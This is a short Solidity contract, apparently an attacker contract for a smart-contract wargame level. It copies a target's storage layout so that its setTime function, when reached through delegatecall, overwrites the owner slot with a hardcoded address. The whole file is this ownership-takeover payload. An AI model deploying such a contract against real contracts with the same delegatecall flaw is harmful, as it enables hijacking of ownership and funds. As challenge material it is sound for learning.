pragma solidity ^0.8.0;

contract Preservation {
    // same order as there in the caller contract.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        // owner = address(this);
        owner = address(0x2d6A73e090d4cbe000156F13147084182ccA568d);
    }
}
